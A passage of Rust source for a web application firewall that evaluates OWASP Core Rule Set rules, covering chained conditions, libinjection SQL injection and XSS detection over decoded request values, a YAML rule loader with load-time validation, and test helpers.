    /// rejected at load time rather than silently comparing against a literal
    /// `%{...}` that no request will ever contain.
    fn parse(raw: &str) -> Option<Self> {
        let mut parts = Vec::new();
        let mut rest = raw;
        while let Some(start) = rest.find("%{") {
            let (before, from_macro) = rest.split_at(start);
            if !before.is_empty() {
                parts.push(OperandPart::Lit(before.to_owned()));
            }
            let body = from_macro.get(2..)?;
            let end = body.find('}')?;
            let (name, after) = body.split_at(end);
            parts.push(Self::macro_part(name)?);
            rest = after.get(1..)?;
        }
        if !rest.is_empty() || parts.is_empty() {
            parts.push(OperandPart::Lit(rest.to_owned()));
        }
        Some(Self(parts))
    }

    fn macro_part(name: &str) -> Option<OperandPart> {
        let lower = name.trim().to_ascii_lowercase();
        if let Some(index) = lower.strip_prefix("tx.") {
            return index.parse::<u8>().ok().map(OperandPart::Capture);
        }
        (lower == "request_headers.host").then_some(OperandPart::Host)
    }

    /// The whole operand when it is a single literal, for load-time checks.
    fn literal(&self) -> Option<&str> {
        match (self.0.len(), self.0.first()) {
            (1, Some(OperandPart::Lit(text))) => Some(text.as_str()),
            _ => None,
        }
    }

    /// Highest `%{TX.N}` index referenced, for load-time validation.
    fn max_capture(&self) -> Option<u8> {
        self.0
            .iter()
            .filter_map(|p| match p {
                OperandPart::Capture(n) => Some(*n),
                OperandPart::Lit(_) | OperandPart::Host => None,
            })
            .max()
    }

    /// Expand against the current chain state.  `None` when a referenced
    /// capture or header is absent, which makes the comparison fail rather
    /// than succeed against an empty string.
    fn resolve<'s>(&'s self, ctx: &RequestCtx, state: &ChainState<'_>) -> Option<Cow<'s, str>> {
        if let (1, Some(OperandPart::Lit(text))) = (self.0.len(), self.0.first()) {
            return Some(Cow::Borrowed(text.as_str()));
        }
        let mut out = String::new();
        for part in &self.0 {
            match part {
                OperandPart::Lit(text) => out.push_str(text),
                OperandPart::Capture(n) => out.push_str(state.captures.get(usize::from(*n))?),
                OperandPart::Host => out.push_str(ctx.headers.get("host")?),
            }
        }
        Some(Cow::Owned(out))
    }
}

// ── Chain evaluation state ────────────────────────────────────────────────────

/// Which form of a value satisfied a matcher.
///
/// `Same` means the value as supplied; `Transformed` carries the decoded text
/// so it, not the raw input, becomes the `matched_value` a later condition
/// sees.
enum MatchForm {
    Same,
    Transformed(String),
}

/// Result of testing one value.
enum Outcome {
    Match(MatchForm),
    NoMatch,
    /// The comparison could not be made at all — a `%{...}` operand names
    /// something this request does not have.
    ///
    /// Distinct from `NoMatch` because negation must not turn it into a hit:
    /// `!@endsWith %{request_headers.host}` on a request with no `Host` header
    /// would otherwise fire on every such request.
    Unresolvable,
}

/// Carried between the conditions of one chained rule, for one request.
struct ChainState<'a> {
    /// The values the most recent condition matched — `ModSecurity`
    /// `MATCHED_VAR` / `MATCHED_VARS` — each with the [`Decoding`] of the
    /// surface it came from.
    matched: Vec<(Cow<'a, str>, Decoding)>,
    /// `tx:0`..`tx:N` from the most recent condition that declared `capture`;
    /// index 0 is the whole match, as in `ModSecurity`.
    captures: Vec<String>,
    /// The [`Decoding`] of the value those captures were taken from.
    capture_decoding: Decoding,
}

impl Default for ChainState<'_> {
    fn default() -> Self {
        Self {
            matched: Vec::new(),
            captures: Vec::new(),
            // Nothing has been captured yet; the conservative surface class is
            // the one that decodes nothing.
            capture_decoding: Decoding::Verbatim,
        }
    }
}

// ── Compiled rule ─────────────────────────────────────────────────────────────

enum CompiledMatcher {
    Regex(Regex),
    Contains(Operand),
    /// Case-sensitive exact comparison (`ModSecurity` `@streq` / `@eq`).
    Equals(Operand),
    /// `ModSecurity` `@beginsWith`.
    StartsWith(Operand),
    /// `ModSecurity` `@endsWith`.
    EndsWith(Operand),
    NotIn(Vec<String>),
    Gt(i64),
    Lt(i64),
    /// Aho-Corasick phrase set — backs `contains_any` (`@pm`) and
    /// `pm_from_file` (`@pmFromFile`).  Shared so several rules referencing
    /// the same wordlist compile the automaton once.
    MultiPattern(Arc<AhoCorasick>),
    /// libinjection SQL injection detection (CRS-942100 etc.)
    DetectSqli,
    /// libinjection XSS detection (CRS-941100 etc.)
    DetectXss,
}

impl CompiledMatcher {
    /// Test one value.  `Some` carries the form that matched, which becomes the
    /// `matched_value` seen by the next condition of a chain.
    ///
    /// `decoding` says whether the surface `value` came from is one upstream
    /// would have percent-decoded; on a [`Decoding::Verbatim`] surface every
    /// matcher tests the received bytes and nothing else.
    fn test(&self, value: &str, decoding: Decoding, ctx: &RequestCtx, state: &ChainState<'_>) -> Outcome {
        let plain = |hit: bool| {
            if hit {
                Outcome::Match(MatchForm::Same)
            } else {
                Outcome::NoMatch
            }
        };
        // Test the raw value, plus its decoded forms when the surface is one
        // upstream decodes.  A macro rather than a closure so each matcher's
        // test is monomorphised and inlines into the raw-value comparison.
        macro_rules! forms {
            ($f:expr) => {
                matching_form(value, decoding, $f)
            };
        }
        macro_rules! operand {
            ($operand:expr) => {
                match $operand.resolve(ctx, state) {
                    Some(resolved) => resolved,
                    None => return Outcome::Unresolvable,
                }
            };
        }
        match self {
            // The CRS patterns are written against ModSecurity's decoded
            // `ARGS` / `REQUEST_COOKIES` / `REQUEST_FILENAME`, so a raw-only
            // test is bypassed by percent-encoding the payload.
            Self::Regex(re) => forms!(|v: &str| re.is_match(v)),
            // Deliberately raw-only.  The one shipped `contains` condition on a
            // request surface is CRS-920610, which reads `REQUEST_URI_RAW` to
            // flag an *unencoded* `#` in the URI — decoding it would turn every
            // legitimately escaped `%23` into a block.  See the module test
            // `contains_stays_raw_so_an_escaped_hash_is_not_a_raw_fragment`.
            Self::Contains(operand) => plain(value.contains(operand!(operand).as_ref())),
            Self::Equals(operand) => {
                let needle = operand!(operand);
                forms!(|v: &str| v == needle.as_ref())
            }
            Self::StartsWith(operand) => {
                let needle = operand!(operand);
                forms!(|v: &str| v.starts_with(needle.as_ref()))
            }
            Self::EndsWith(operand) => {
                let needle = operand!(operand);
                forms!(|v: &str| v.ends_with(needle.as_ref()))
            }
            // Raw-only, and a no-op if it were not: `not_in` backs CRS-911100's
            // method allow-list, upstream reads `REQUEST_METHOD` untransformed,
            // and a method token cannot legally carry `%` or `+`.  Decoding a
            // deny-by-default list can only ever widen what it rejects.
            Self::NotIn(list) => plain(!list.iter().any(|allowed| allowed.eq_ignore_ascii_case(value))),
            // Raw-only: both operands read engine-synthesised integers
            // (`content_length`, header counts) that no client can encode.
            Self::Gt(n) => plain(value.parse::<i64>().is_ok_and(|v| v > *n)),
            Self::Lt(n) => plain(value.parse::<i64>().is_ok_and(|v| v < *n)),
            Self::MultiPattern(ac) => forms!(|v: &str| ac.is_match(v)),
            Self::DetectSqli => forms!(|v: &str| libinjectionrs::detect_sqli(v.as_bytes()).is_injection()),
            Self::DetectXss => forms!(|v: &str| libinjectionrs::detect_xss(v.as_bytes()).is_injection()),
        }
    }

    /// The libinjection detector this matcher runs, if any.
    fn detector(&self) -> Option<fn(&[u8]) -> bool> {
        match self {
            Self::DetectSqli => Some(|input| libinjectionrs::detect_sqli(input).is_injection()),
            Self::DetectXss => Some(|input| libinjectionrs::detect_xss(input).is_injection()),
            _ => None,
        }
    }
}

/// Where a condition reads its values from.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum CondField {
    /// A request surface.
    Request(Field),
    /// `ModSecurity` `MATCHED_VAR` / `MATCHED_VARS`: the values the preceding
    /// condition matched.  Only meaningful inside a chain.
    MatchedValue,
    /// `ModSecurity` `TX:N`: capture group `N` of the last capturing condition.
    Capture(u8),
}

/// Resolve a condition's `field` name.
///
/// The two chain pseudo-fields are spelled apart from the request surfaces so
/// a rule file can never accidentally name one: `matched_value` and `tx:N`
/// contain no character sequence a `Surfaces` list can produce.
fn parse_cond_field(name: &str) -> Option<CondField> {
    if name == "matched_value" {
        return Some(CondField::MatchedValue);
    }
    if let Some(index) = name.strip_prefix("tx:") {
        return index.parse::<u8>().ok().map(CondField::Capture);
    }
    Field::parse(name).map(CondField::Request)
}

/// One condition of a rule: the head, or one link of its chain.
struct Condition {
    field: CondField,
    matcher: CompiledMatcher,
    /// `!@op`: the condition holds for values the matcher rejects.
    negate: bool,
    /// Bind this condition's regex groups to `tx:0..` for later conditions.
    capture: bool,
}

impl Condition {
    /// Short-circuiting test used for the head of every rule.
    ///
    /// Allocation-free on the hot path: an ordinary request is answered by the
    /// first surface that fails, and nothing about the match is recorded.
    fn matches_any(&self, ctx: &RequestCtx) -> bool {
        let CondField::Request(field) = self.field else {
            // A bare `matched_value` / `tx:N` head has nothing to read; the
            // loader rejects it, so this is unreachable in a loaded rule set.
            return false;
        };
        if !self.negate
            && let Some(detector) = self.matcher.detector()
        {
            return detect_injection(field, ctx, detector);
        }
        let empty = ChainState::default();
        field.any_value(ctx, |value, decoding| {
            match self.matcher.test(value, decoding, ctx, &empty) {
                Outcome::Match(_) => !self.negate,
                Outcome::NoMatch => self.negate,
                Outcome::Unresolvable => false,
            }
        })
    }

    /// Evaluate inside a chain, threading `state` forward.
    ///
    /// Returns `false` as soon as no value satisfies the condition, so the
    /// remaining links are never evaluated.
    ///
    /// Each subject carries the [`Decoding`] of the surface it originated from,
    /// and a `matched_value` / `tx:N` link inherits it: re-testing the text a
    /// previous condition matched must not start decoding a header value just
    /// because it passed through a chain.
    fn advance<'a>(&self, ctx: &'a RequestCtx, state: &mut ChainState<'a>) -> bool {
        let subjects: Vec<(Cow<'a, str>, Decoding)> = match self.field {
            CondField::Request(field) => field.collect_values(ctx),
            CondField::MatchedValue => std::mem::take(&mut state.matched),
            CondField::Capture(n) => state
                .captures
                .get(usize::from(n))
                .cloned()
                .map(|text| (Cow::Owned(text), state.capture_decoding))
                .into_iter()
                .collect(),
        };

        let mut hits: Vec<(Cow<'a, str>, Decoding)> = Vec::new();
        for (value, decoding) in subjects {
            match (self.matcher.test(&value, decoding, ctx, state), self.negate) {
                (Outcome::Match(MatchForm::Same), false) | (Outcome::NoMatch, true) => hits.push((value, decoding)),
                (Outcome::Match(MatchForm::Transformed(decoded)), false) => {
                    hits.push((Cow::Owned(decoded), decoding));
                }
                _ => {}
            }
        }
        let Some((first, first_decoding)) = hits.first() else {
            return false;
        };

        if self.capture
            && let CompiledMatcher::Regex(re) = &self.matcher
            && let Some(groups) = re.captures(first)
        {
            state.capture_decoding = *first_decoding;
            state.captures = groups
                .iter()
                .map(|group| group.map_or_else(String::new, |m| m.as_str().to_owned()))
                .collect();
        }
        state.matched = hits;
        true
    }
}

struct CompiledRule {
    id: String,
    name: String,
    paranoia: u8,
    head: Condition,
    /// Additional conditions that must all hold (`ModSecurity` `chain`).
    /// Empty for an ordinary rule.
    chain: Vec<Condition>,
    #[allow(dead_code)]
    action: String,
}

impl CompiledRule {
    fn matches(&self, ctx: &RequestCtx) -> bool {
        // The cheap short-circuiting test runs first for every rule, chained or
        // not, so ordinary traffic pays exactly what it paid before chains
        // existed.  Only a request that already satisfies the head is walked a
        // second time to record which values matched.
        if !self.head.matches_any(ctx) {
            return false;
        }
        if self.chain.is_empty() {
            return true;
        }
        let mut state = ChainState::default();
        if !self.head.advance(ctx, &mut state) {
            return false;
        }
        self.chain.iter().all(|link| link.advance(ctx, &mut state))
    }
}

/// Run a libinjection detector against the values of `field`.
///
/// For a composite field, scans exactly the surfaces it names (`all` being the
/// whole request, matching CRS behavior for libinjection rules).  Each value is
/// tested in raw form, single-decoded form, and recursively-decoded form (up to
/// [`super::MAX_DECODE_PASSES`] passes, currently 5) to catch `%`-encoded and
/// double/triple-encoded evasion attempts.  For any other field, every value it
/// expands to is tested in all three forms.
///
/// This path decodes *every* surface, including the header values that
/// [`Decoding::Verbatim`] holds back from the pattern matchers.  That is
/// deliberate and predates surface-scoped decoding: libinjection is a semantic
/// tokeniser rather than a text pattern, so feeding it a decoded header cannot
/// produce the class of false positive a decoded header produces for a CRS
/// regex, and the extra coverage is worth keeping.
fn detect_injection(field: Field, ctx: &RequestCtx, detector: impl Fn(&[u8]) -> bool) -> bool {
    // Helper: test raw, single-decoded, and recursively-decoded forms.
    let detect_with_decode = |raw: &str| -> bool {
        if detector(raw.as_bytes()) {
            return true;
        }
        let decoded = url_decode(raw);
        if decoded != raw && detector(decoded.as_bytes()) {
            return true;
        }
        let recursive = url_decode_recursive(raw);
        recursive != decoded && detector(recursive.as_bytes())
    };

    if let Field::Multi(s) = field {
        // The raw byte body is additionally tested unmodified, because the
        // lossy UTF-8 conversion can destroy a binary payload.
        let header = |name: &str| ctx.headers.get(name).is_some_and(|v| detect_with_decode(v));
        return (s.has(Surfaces::PATH) && detect_with_decode(&ctx.path))
            || (s.has(Surfaces::QUERY) && detect_with_decode(&ctx.query))
            || (s.has(Surfaces::BODY)
                && (detector(&ctx.body_preview) || detect_with_decode(&String::from_utf8_lossy(&ctx.body_preview))))
            || (s.has(Surfaces::COOKIES) && cookie_values(ctx).any(detect_with_decode))
            || (s.has(Surfaces::HEADER_VALUES) && ctx.headers.values().any(|v| detect_with_decode(v)))
            || (s.has(Surfaces::USER_AGENT) && header("user-agent"))
            || (s.has(Surfaces::REFERER) && header("referer"));
    }
    field.any_value(ctx, |value, _decoding| detect_with_decode(value))
}

// ── Loader ────────────────────────────────────────────────────────────────────

/// Wordlist load outcome, cached per file name so a failure is reported the
/// same way for every rule referencing it and a success is compiled once.
type WordlistResult = Result<Arc<AhoCorasick>, String>;

struct Loader {
    rules: Vec<CompiledRule>,
    summary: LoadSummary,
    /// Directory holding `pm_from_file` wordlists; `None` when the rules did
    /// not come from a directory (in that case `pm_from_file` is rejected
    /// rather than silently skipped).
    data_dir: Option<PathBuf>,
    wordlists: HashMap<String, WordlistResult>,
}

impl Loader {
    fn new(data_dir: Option<PathBuf>) -> Self {
        Self {
            rules: Vec::new(),
            summary: LoadSummary::default(),
            data_dir,
            wordlists: HashMap::new(),
        }
    }

    fn push_source_error(&mut self, source: String, error: String) {
        self.summary.source_errors.push(SourceError { source, error });
    }

    fn add_source(&mut self, source: &str, content: &str) {
        let ruleset: RuleSet = match serde_yaml::from_str(content) {
            Ok(parsed) => parsed,
            Err(e) => {
                self.push_source_error(source.to_owned(), e.to_string());
                return;
            }
        };

        for rule in ruleset.rules {
            self.summary.attempted = self.summary.attempted.saturating_add(1);
            let rule_id = rule.id.clone();
            match self.compile(rule) {
                Ok(compiled) => self.rules.push(compiled),
                Err(reason) => self.summary.rejected.push(RejectedRule {
                    rule_id,
                    source: source.to_owned(),
                    reason,
                }),
            }
        }
        self.summary.compiled = self.rules.len();
    }

    fn compile(&mut self, rule: YamlRule) -> Result<CompiledRule, RejectReason> {
        // `capture` binds tx:0..tx:N for the conditions that follow; the count
        // is carried forward so a `tx:N` read that nothing produces is rejected
        // at load time instead of never matching at runtime.
        let mut bound_captures = 0usize;

        // `matched_value` / `tx:N` read what an earlier condition produced, so
        // they mean nothing as the head of a rule.
        if !matches!(parse_cond_field(&rule.field), Some(CondField::Request(_))) {
            return Err(RejectReason::UnsupportedField(rule.field.clone()));
        }
        let head = self.compile_condition(
            "head",
            &rule.field,
            &rule.operator,
            &rule.value,
            rule.negate,
            rule.capture,
            &mut bound_captures,
        )?;

        let mut chain = Vec::with_capacity(rule.chain.len());
        for (index, link) in rule.chain.iter().enumerate() {
            let position = format!("chain[{index}]");
            let condition = self
                .compile_condition(
                    &position,
                    &link.field,
                    &link.operator,
                    &link.value,
                    link.negate,
                    link.capture,
                    &mut bound_captures,
                )
                .map_err(|reason| match reason {
                    already @ (RejectReason::Chain { .. }
                    | RejectReason::CaptureWithoutRegex { .. }
                    | RejectReason::UnresolvedCapture { .. }) => already,
                    inner => RejectReason::Chain {
                        position: position.clone(),
                        detail: inner.to_string(),
                    },
                })?;
            chain.push(condition);
        }

        Ok(CompiledRule {
            id: rule.id,
            name: rule.name,
            paranoia: rule.paranoia,
            head,
            chain,
            action: rule.action,
        })
    }

    /// Compile one condition — the head or one chain link.
    ///
    /// `bound_captures` is the number of `tx:` slots the preceding conditions
    /// bound (0 when nothing captured yet); it is updated in place when this
    /// condition declares `capture`.
    #[allow(clippy::too_many_arguments)]
    fn compile_condition(
        &mut self,
        position: &str,
        field_name: &str,
        operator: &str,
        value: &YamlValue,
        negate: bool,
        capture: bool,
        bound_captures: &mut usize,
    ) -> Result<Condition, RejectReason> {
        // Validate the field *before* the operator: an unreadable field makes
        // the condition unevaluable no matter which matcher it asks for.
        let field =
            parse_cond_field(field_name).ok_or_else(|| RejectReason::UnsupportedField(field_name.to_owned()))?;
        if let CondField::Capture(index) = field
            && usize::from(index) >= *bound_captures
        {
            return Err(RejectReason::UnresolvedCapture {
                position: position.to_owned(),
                index,
            });
        }

        // Scalar comparisons stay restricted to single-valued request fields:
        // the schema cannot express the CRS collection-member selector, so
        // `equals` on `cookies` would silently mean "any cookie".  Chain
        // pseudo-fields are exempt — they are single values by construction.
        if let CondField::Request(request_field) = field
            && matches!(operator, "equals" | "not_in" | "gt" | "lt")
            && !request_field.is_scalar()
        {
            return Err(RejectReason::NonScalarField {
                operator: operator.to_owned(),
                field: field_name.to_owned(),
            });
        }

        let operand = |op: &str| -> Result<Operand, RejectReason> {
            let raw = str_value(value, op)?;
            Operand::parse(raw).ok_or_else(|| RejectReason::InvalidValueType {
                operator: op.to_owned(),
                expected: "literal or %{TX.N} / %{REQUEST_HEADERS.HOST} macro",
            })
        };

        let matcher = match operator {
            "regex" => {
                let pattern = str_value(value, operator)?;
                Regex::new(pattern)
                    .map(CompiledMatcher::Regex)
                    .map_err(|e| RejectReason::InvalidRegex(e.to_string()))?
            }
            "contains" => CompiledMatcher::Contains(operand(operator)?),
            "equals" => CompiledMatcher::Equals(operand(operator)?),
            "starts_with" => CompiledMatcher::StartsWith(operand(operator)?),
            "ends_with" => CompiledMatcher::EndsWith(operand(operator)?),
            "contains_any" => CompiledMatcher::MultiPattern(build_phrase_set(value, operator)?),
            "pm_from_file" => {
                let file = str_value(value, operator)?;
                CompiledMatcher::MultiPattern(self.wordlist(file)?)
            }
            "not_in" => {
                let YamlValue::List(list) = value else {
                    return Err(RejectReason::InvalidValueType {
                        operator: operator.to_owned(),
                        expected: "list of strings",
                    });
                };
                CompiledMatcher::NotIn(list.clone())
            }
            "gt" => CompiledMatcher::Gt(int_value(value, operator)?),
            "lt" => CompiledMatcher::Lt(int_value(value, operator)?),
            "detect_sqli" | "@detectSQLi" => CompiledMatcher::DetectSqli,
            "detect_xss" | "@detectXSS" => CompiledMatcher::DetectXss,
            other => return Err(RejectReason::UnsupportedOperator(other.to_owned())),
        };

        // A macro operand may only name a capture an earlier condition bound.
        if let Some(highest) = match &matcher {
            CompiledMatcher::Contains(operand)
            | CompiledMatcher::Equals(operand)
            | CompiledMatcher::StartsWith(operand)
            | CompiledMatcher::EndsWith(operand) => operand.max_capture(),
            _ => None,
        } && usize::from(highest) >= *bound_captures
        {
            return Err(RejectReason::UnresolvedCapture {
                position: position.to_owned(),
                index: highest,
            });
        }

        // A header count is 0 or 1 in this engine (repeated headers are folded
        // into one entry), so a comparison against anything else — or with any
        // other operator — could never be reached and is refused instead of
        // shipping a rule that never fires.
        if let CondField::Request(Field::HeaderCount(_)) = field {
            let reachable = match &matcher {
                CompiledMatcher::Equals(operand) => matches!(operand.literal(), Some("0" | "1")),
                _ => false,
            };
            if !reachable {
                return Err(RejectReason::InvalidValueType {
                    operator: operator.to_owned(),
                    expected: "`equals` against '0' or '1' (a header count is presence-only here)",
                });
            }
        }

        if capture {
            let CompiledMatcher::Regex(re) = &matcher else {
                return Err(RejectReason::CaptureWithoutRegex {
                    position: position.to_owned(),
                });
            };
            *bound_captures = re.captures_len();
        }

        Ok(Condition {
            field,
            matcher,
            negate,
            capture,
        })
    }

    /// Resolve a `pm_from_file` wordlist to a shared automaton.
    fn wordlist(&mut self, file: &str) -> Result<Arc<AhoCorasick>, RejectReason> {
        let reject = |error: String| RejectReason::DataFile {
            file: file.to_owned(),
            error,
        };

        // The name comes from a YAML file on disk: keep it a plain file name so
        // a rule can never reach outside the rule set's data directory.
        if file.is_empty() || file.contains('/') || file.contains('\\') || file.contains("..") {
            return Err(reject("not a plain file name".to_owned()));
        }

        if let Some(cached) = self.wordlists.get(file) {
            return cached.clone().map_err(reject);
        }

        let Some(dir) = self.data_dir.as_ref() else {
            return Err(reject("this rule source has no associated data directory".to_owned()));
        };

        let outcome = build_wordlist(&dir.join(file));
        self.wordlists.insert(file.to_owned(), outcome.clone());
        outcome.map_err(reject)
    }

    fn finish(self, origin: &str) -> OWASPCheck {
        self.summary.report(origin);
        OWASPCheck {
            rules: self.rules,
            summary: self.summary,
        }
    }
}

fn str_value<'a>(value: &'a YamlValue, operator: &str) -> Result<&'a str, RejectReason> {
    match value {
        YamlValue::Str(s) => Ok(s.as_str()),
        YamlValue::List(_) | YamlValue::Int(_) => Err(RejectReason::InvalidValueType {
            operator: operator.to_owned(),
            expected: "string",
        }),
    }
}

fn int_value(value: &YamlValue, operator: &str) -> Result<i64, RejectReason> {
    match value {
        YamlValue::Int(n) => Ok(*n),
        YamlValue::Str(_) | YamlValue::List(_) => Err(RejectReason::InvalidValueType {
            operator: operator.to_owned(),
            expected: "integer",
        }),
    }
}

/// Build the Aho-Corasick automaton for a `contains_any` (`@pm`) phrase set.
///
/// Accepts the CRS form (one whitespace-separated string of phrases) and a
/// YAML list of phrases.
fn build_phrase_set(value: &YamlValue, operator: &str) -> Result<Arc<AhoCorasick>, RejectReason> {
    let phrases: Vec<&str> = match value {
        YamlValue::Str(s) => s.split_whitespace().collect(),
        YamlValue::List(list) => list.iter().map(String::as_str).filter(|s| !s.is_empty()).collect(),
        YamlValue::Int(_) => {
            return Err(RejectReason::InvalidValueType {
                operator: operator.to_owned(),
                expected: "string or list of strings",
            });
        }
    };
    if phrases.is_empty() {
        return Err(RejectReason::PatternSet("no phrases".to_owned()));
    }
    build_automaton(&phrases).map_err(RejectReason::PatternSet)
}

/// Read a CRS `.data` wordlist and compile it into an automaton.
///
/// Blank lines and `#` comments are skipped and every entry is trimmed, which
/// is how `ModSecurity` reads `@pmFromFile` lists.
fn build_wordlist(path: &Path) -> WordlistResult {
    let content = std::fs::read_to_string(path).map_err(|e| format!("cannot read {}: {e}", path.display()))?;
    let patterns: Vec<&str> = content
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .collect();
    if patterns.is_empty() {
        return Err(format!("{} contains no usable patterns", path.display()));
    }
    debug!("OWASP CRS wordlist {} → {} patterns", path.display(), patterns.len());
    build_automaton(&patterns).map_err(|e| format!("{}: {e}", path.display()))
}

/// `MatchKind::Standard` is used because callers only need "does any phrase
/// occur"; ASCII case-insensitivity mirrors CRS's `t:lowercase` transform.
fn build_automaton(patterns: &[&str]) -> Result<Arc<AhoCorasick>, String> {
    AhoCorasickBuilder::new()
        .match_kind(MatchKind::Standard)
        .ascii_case_insensitive(true)
        .build(patterns)
        .map(Arc::new)
        .map_err(|e| e.to_string())
}

// ── OWASPCheck ────────────────────────────────────────────────────────────────

/// WAF checker implementing a subset of the `OWASP` CRS.
pub struct OWASPCheck {
    rules: Vec<CompiledRule>,
    summary: LoadSummary,
}

impl OWASPCheck {
    /// Create by loading rules from `rules/owasp-crs/` relative to the
    /// current working directory.
    ///
    /// # Degradation policy
    ///
    /// The check is one of ~18 detection phases in front of customer traffic,
    /// and this constructor is infallible by construction (the engine builds
    /// it during startup wiring), so a broken rule set must not translate into
    /// "block every request" — that would turn a configuration defect into a
    /// total outage while the other phases still work.  Instead the load is
    /// *loud*: unreadable sources are `ERROR`, rejected rules are `WARN` with
    /// their ids, and [`LoadSummary::is_degraded`] exposes the state for
    /// health reporting.  When the directory yields zero enforceable rules the
    /// minimal embedded set is substituted (strictly better than none) and the
    /// substitution is logged at `ERROR` and recorded in the summary.
    pub fn new() -> Self {
        let dir = Path::new(DEFAULT_RULES_DIR);
        if !dir.is_dir() {
            warn!(
                "{DEFAULT_RULES_DIR}/ not found; using the minimal embedded OWASP rule set — \
                 full CRS coverage is NOT active"
            );
            return Self::embedded_fallback(LoadSummary::default());
        }

        let loaded = Self::from_directory(dir);
        if loaded.rule_count() > 0 {
            return loaded;
        }

        error!(
            "{DEFAULT_RULES_DIR}/ exists but produced 0 enforceable rules ({} declared, {} rejected, \
             {} unreadable source(s)); substituting the minimal embedded rule set — CRS coverage is effectively OFF",
            loaded.summary.attempted,
            loaded.summary.rejected.len(),
            loaded.summary.source_errors.len()
        );
        Self::embedded_fallback(loaded.summary)
    }

    /// Compile the embedded rule set, carrying `prior` diagnostics forward so
    /// the failed on-disk attempt stays visible in [`Self::load_summary`].
    fn embedded_fallback(prior: LoadSummary) -> Self {
        let mut check = Self::from_yaml_at(EMBEDDED_RULES_YAML, EMBEDDED_ORIGIN, None);
        check.summary.used_embedded_fallback = true;
        check.summary.attempted = check.summary.attempted.saturating_add(prior.attempted);
        check.summary.rejected.extend(prior.rejected);
        check.summary.source_errors.extend(prior.source_errors);
        check
    }

    /// Load all `.yaml` files from a directory, merging their rule lists.
    ///
    /// `pm_from_file` wordlists are resolved against `<dir>/data/`.  Files are
    /// visited in sorted order so first-match rule precedence does not depend
    /// on filesystem iteration order.
    pub fn from_directory(dir: &Path) -> Self {
        let mut loader = Loader::new(Some(dir.join(DATA_SUBDIR)));

        match std::fs::read_dir(dir) {
            Ok(entries) => {
                let mut paths: Vec<PathBuf> = entries
                    .flatten()
                    .map(|entry| entry.path())
                    .filter(|path| path.extension().and_then(OsStr::to_str) == Some("yaml"))
                    .collect();
                paths.sort();
                for path in paths {
                    let label = path.display().to_string();
                    match std::fs::read_to_string(&path) {
                        Ok(content) => loader.add_source(&label, &content),
                        Err(e) => loader.push_source_error(label, e.to_string()),
                    }
                }
            }
            Err(err) => loader.push_source_error(dir.display().to_string(), err.to_string()),
        }

        loader.finish(&dir.display().to_string())
    }

    /// Create from a YAML string (single-document, `RuleSet` format).
    ///
    /// `pm_from_file` rules are rejected (no data directory is associated with
    /// an in-memory source); use [`Self::from_yaml_with_data_dir`] to supply
    /// one.
    pub fn from_yaml(yaml: &str) -> Self {
        Self::from_yaml_at(yaml, INLINE_ORIGIN, None)
    }

    /// Like [`Self::from_yaml`], but resolves `pm_from_file` wordlists against
    /// `data_dir`.
    pub fn from_yaml_with_data_dir(yaml: &str, data_dir: &Path) -> Self {
        Self::from_yaml_at(yaml, INLINE_ORIGIN, Some(data_dir.to_path_buf()))
    }

    fn from_yaml_at(yaml: &str, origin: &str, data_dir: Option<PathBuf>) -> Self {
        let mut loader = Loader::new(data_dir);
        loader.add_source(origin, yaml);
        loader.finish(origin)
    }

    /// Try to load from a single YAML file, falling back to defaults on error.
    pub fn from_file_or_default(path: &Path) -> Self {
        match std::fs::read_to_string(path) {
            Ok(content) => {
                debug!("Loading OWASP rules from {}", path.display());
                Self::from_yaml_at(
                    &content,
                    &path.display().to_string(),
                    path.parent().map(Path::to_path_buf),
                )
            }
            Err(e) => {
                warn!(
                    "Cannot read OWASP rule file {} ({e}); falling back to the default rule set",
                    path.display()
                );
                Self::new()
            }
        }
    }

    /// Number of rules that are actually enforced.  Rules declared in the
    /// source but rejected at load time are **not** counted.
    pub const fn rule_count(&self) -> usize {
        self.rules.len()
    }

    /// Full account of the last load — declared vs. enforced counts, rejection
    /// reasons and affected rule ids, and unreadable sources.
    pub const fn load_summary(&self) -> &LoadSummary {
        &self.summary
    }
}

impl Default for OWASPCheck {
    fn default() -> Self {
        Self::new()
    }
}

impl Check for OWASPCheck {
    fn check(&self, ctx: &RequestCtx) -> Option<DetectionResult> {
        if !ctx.host_config.defense_config.owasp_set {
            return None;
        }

        // Use paranoia level from defense config (default 1)
        let paranoia = ctx.host_config.defense_config.owasp_paranoia;

        for rule in &self.rules {
            if rule.paranoia > paranoia {
                continue;
            }
            if rule.matches(ctx) {
                return Some(DetectionResult {
                    rule_id: Some(rule.id.clone()),
                    rule_name: rule.name.clone(),
                    phase: Phase::Owasp,
                    detail: format!("OWASP rule {} triggered ({})", rule.id, rule.name),
                });
            }
        }

        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use bytes::Bytes;
    use std::collections::HashMap;
    use std::sync::Arc;
    use waf_common::{DefenseConfig, HostConfig};

    /// Absolute path to the shipped CRS rule set (tests run with the crate
    /// directory as CWD, so the relative default does not resolve).
    fn crs_dir() -> PathBuf {
        Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/owasp-crs")
    }

    fn crs_data_dir() -> PathBuf {
        crs_dir().join(DATA_SUBDIR)
    }

    fn make_ctx(method: &str, path: &str, content_length: u64) -> RequestCtx {
        let dc = DefenseConfig {
            owasp_set: true,
            ..DefenseConfig::default()
        };
        let host_config = Arc::new(HostConfig {
            code: "test".into(),
            host: "example.com".into(),
            defense_config: dc,
            ..HostConfig::default()
        });
        RequestCtx {
            req_id: "test".into(),
            client_ip: "1.2.3.4".parse().unwrap(),
            client_port: 0,
            method: method.into(),
            host: "example.com".into(),
            port: 80,
            path: path.into(),
            query: String::new(),
            headers: HashMap::new(),
            body_preview: Bytes::new(),
            content_length,
            is_tls: false,
            host_config,
            geo: None,
        }
    }

    fn make_ctx_with_query(query: &str) -> RequestCtx {
        let mut ctx = make_ctx("GET", "/", 0);
        ctx.query = query.into();
        ctx
    }

    /// A `POST` carrying `body` as the request body, evaluated at `paranoia`.
    fn make_ctx_with_body(body: &str, paranoia: u8) -> RequestCtx {
        let mut ctx = make_ctx("POST", "/api/save", body.len() as u64);
        ctx.body_preview = Bytes::copy_from_slice(body.as_bytes());
        let dc = DefenseConfig {
            owasp_set: true,
            owasp_paranoia: paranoia,
            ..DefenseConfig::default()
        };
        ctx.host_config = Arc::new(HostConfig {
            code: "test".into(),
            host: "example.com".into(),
            defense_config: dc,
            ..HostConfig::default()
        });
        ctx
    }

